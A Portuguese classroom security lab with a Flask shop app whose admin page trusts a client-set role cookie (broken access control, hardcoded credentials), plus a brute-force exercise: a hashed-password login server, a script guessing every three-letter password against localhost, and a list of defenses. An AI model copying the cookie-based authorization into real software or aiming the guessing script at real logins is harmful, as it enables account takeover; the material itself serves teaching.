```python
from flask import Flask, request, make_response, redirect, url_for

app = Flask(__name__)

@app.route('/')
def index():
    # Identificando quem é o usuário
    perfil = request.cookies.get('user_role', 'visitante')
    
    return f'''
        <h1>Loja ETEC - Lab de Segurança</h1>
        <p>Seu perfil atual detectado pelo sistema: <b>{perfil}</b></p>
        <hr>
        <a href="/login">Fazer Login</a> | <a href="/admin">Acessar Painel Admin</a>
        <br><br>
        <h3>Nossos Produtos:</h3>
        <ul>
            <li><a href="/produto/1">Notebook</a></li>
            <li><a href="/produto/2">Mouse</a></li>
            <li><a href="/produto/3">Teclado</a></li>
        </ul>
    '''

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('user')
        password = request.form.get('password')
        
        # O sistema verifica o usuário e senha
        if user == 'usr' and password == 'senha123':
            resp = make_response(redirect(url_for('index')))
            # ATENÇÃO: Veja como o sistema "lembra" quem é você...
            resp.set_cookie('user_role', 'comum') 
            return resp
        else:
            return "Login falhou."

    return '''
        <h2>Página de Login</h2>
        <form method="post">
            Usuário: <input type="text" name="user"><br><br>
            Senha: <input type="password" name="password"><br><br>
            <input type="submit" value="Entrar">
        </form>
    '''

@app.route('/admin')
def admin():
    # Rota protegida: como o servidor sabe que você tem permissão?
    if request.cookies.get('user_role') == 'administrador':
        return "<h1>Bem-vindos à área admin!</h1><p>Parabéns, você explorou o Broken Access Control!</p>"
    else:
        return "<h1>Acesso Negado</h1><p>Somente a diretoria pode ver esta página.</p>", 403

@app.route('/produto/<int:id>')
def produto(id):
    return f"<h1>Detalhes do Produto {id}</h1><a href='/'>Voltar</a>"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```

# Desafio

### 1. Teoria: O que é um Ataque de Força Bruta (Brute Force)?
O ataque de **Força Bruta** é um método de tentativa e erro usado para descobrir senhas ou chaves criptográficas. Um software testa sistematicamente todas as combinações possíveis de caracteres até encontrar a correta. 

É uma técnica garantida (eventualmente a senha será encontrada), mas sua eficácia depende do tempo: quanto mais longa e complexa a senha, mais trilhões de anos um computador levaria para testar todas as possibilidades.

### 3. Executando o Código

#### Passo A: O Alvo (servidor.py)
Crie este arquivo. Ele simula um servidor que armazena a senha de forma segura (usando Hash SHA-256), impedindo que alguém descubra a senha apenas lendo o código.

```python
from flask import Flask, request
import hashlib

app = Flask(__name__)
# Senha "sec" protegida por Hash
HASH_SECRETO = "96752719266185854817551068c2273e97022d46e336b13997f7481f6d3f2d22"

@app.route('/login', methods=['POST'])
def login():
    tentativa = request.form.get('senha', '')
    if hashlib.sha256(tentativa.encode()).hexdigest() == HASH_SECRETO:
        return "SUCESSO", 200
    return "FALHA", 401

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
```
**Inicie o servidor:** `python servidor.py`

#### Passo B: O Atacante (atacante.py)
Em um **segundo terminal** (não esqueça de ativar o `venv`), crie o script que automatiza as tentativas:

```python
import requests
alfabeto = "abcdefghijklmnopqrstuvwxyz"

print("Iniciando ataque...")
for l1 in alfabeto:
    for l2 in alfabeto:
        for l3 in alfabeto:
            senha = l1 + l2 + l3
            r = requests.post("http://127.0.0.1:5000/login", data={'senha': senha})
            if r.status_code == 200:
                print(f"\n[!] SENHA ENCONTRADA: {senha}")
                exit()
            print(f"Testando: {senha}", end="\r")
```

### 4. Análise Matemática: Por que a complexidade importa?
A senha "sec" possui apenas 3 caracteres minúsculos. O cálculo de possibilidades é simples: **$26^3 = 17.576$ combinações**. Para um computador moderno, isso é instantâneo.

Agora, imagine o cenário com senhas reais:
* **3 letras (Maiúsculas e Minúsculas):** $52^3 = 140.608$ combinações.
* **3 caracteres (Letras, números e símbolos):** $95^3 = 857.375$ combinações.
* **Senha de 8 caracteres (Padrão comum):** $95^8 \approx 6.6$ quatrilhões de combinações.

**Conclusão:** Adicionar apenas um caractere ou aumentar o tipo de símbolos usados eleva o tempo necessário para o ataque de forma **exponencial**.

---

### 5. Como evitar esse tipo de ataque?
Desenvolvedores utilizam diversas camadas de defesa para impedir que robôs tentem senhas infinitamente:

1.  **Bloqueio de Conta:** Bloquear o acesso após 3 ou 5 tentativas erradas por um tempo determinado.
2.  **Rate Limiting:** Limitar a velocidade de requisições por segundo vindas de um mesmo IP.
3.  **CAPTCHA:** Exigir um desafio visual/motor ("Não sou um robô") que scripts simples não conseguem resolver.
4.  **Atraso Progressivo:** Adicionar um tempo de espera (ex: 2 segundos) a cada tentativa errada, tornando o ataque de força bruta inviável pelo tempo que levaria.
